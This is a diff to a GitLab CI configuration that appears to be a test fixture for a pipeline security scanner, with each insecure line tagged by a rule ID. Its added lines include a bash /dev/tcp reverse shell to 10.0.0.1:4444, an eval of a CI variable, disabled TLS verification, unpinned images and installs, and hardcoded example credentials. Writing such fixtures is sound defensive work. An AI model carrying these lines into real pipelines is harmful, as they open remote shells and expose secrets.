@@ -8,6 +8,10 @@ include:
 
 image: python:latest
 
+# GL-028 — top-level services image not pinned.
+services:
+  - postgres:latest
+
 variables:
   AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
   DATABASE_PASSWORD: hunter2
@@ -53,8 +57,22 @@ deploy-prod:
   # GL-014 — self-managed runner without ephemeral tag.
   tags:
     - custom-runner
+  # GL-029 — manual deploy without allow_failure:false silently
+  # defaults to allow_failure:true, so the pipeline reports success
+  # even when an operator never clicks the button.
+  when: manual
   script:
     - ./scripts/deploy.sh
+
+# GL-030 — job-level trigger:include: pulls a child pipeline from a
+# floating branch in another project (same class of risk as GL-005
+# but nested under trigger: rather than the top-level include:).
+trigger-child:
+  stage: deploy
+  trigger:
+    include:
+      - project: 'platform/child-pipelines'
+        ref: main
 
 # GL-016 — curl piped to shell.
 # GL-017 — docker run --privileged.
@@ -68,3 +86,15 @@ insecure-setup:
     - docker run --privileged myimage
     - pip install --trusted-host pypi.internal.com package
     - echo "$CI_JOB_TOKEN" >> /tmp/token.txt
+    # GL-021: package install without lockfile enforcement.
+    - npm install
+    # GL-022: dependency update bypasses lockfile pins.
+    - npm update
+    # GL-025: evidence of malicious activity — bash /dev/tcp reverse shell.
+    - bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+    # GL-023: TLS verification bypass.
+    - git config --global http.sslVerify false
+    # GL-026: dangerous shell idiom — eval re-parses the value as shell.
+    - eval "$CI_CUSTOM_CMD"
+    # GL-027: pip install from an unpinned git URL.
+    - pip install git+https://example.com/internal/helper.git
